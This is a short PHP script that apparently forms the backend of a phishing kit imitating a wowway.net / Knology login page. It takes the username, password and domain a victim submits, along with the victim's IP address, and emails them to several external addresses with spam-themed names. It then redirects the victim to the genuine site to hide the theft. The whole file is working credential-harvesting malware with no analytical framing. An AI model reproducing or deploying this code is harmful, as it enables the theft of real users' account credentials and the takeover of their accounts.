   <?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ wowway.net +-----------connect---\n";
$message .= "username: ".$_POST['username']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "Domain: ".$_POST['domain']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By EMMA-----------------\n";
$send = "suretools21@hotmail.com,spamtools23@zoho.com,suretools21@yahoo.com,s.tols@aol.com,spambox2@writeme.com,spamtools33@gmail.com";
$subject = "Knology.Net";
$headers = "From: obinna<logs@www.wowway.net>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://www.wowway.net/");
	  

?>